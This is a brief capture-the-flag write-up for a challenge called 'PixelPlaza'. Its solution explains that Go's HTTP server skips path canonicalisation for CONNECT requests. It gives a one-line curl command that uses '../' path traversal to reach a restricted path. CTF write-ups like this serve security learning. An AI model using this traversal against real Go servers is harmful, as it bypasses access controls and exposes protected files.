# PixelPlaza

## Author
BerlianGabriel

## Description
I'm a consultant, but my client is using a new technology I'm not familiar with. Can I outsource this whitebox pentest project to you?

## Solution
Golang has CONNECT method which does not perform path canonicalization
https://github.com/golang/go/blob/9bb97ea047890e900dae04202a231685492c4b18/src/net/http/server.go#L2354-L2364

curl --path-as-is -X CONNECT http://host:8080/../docs/text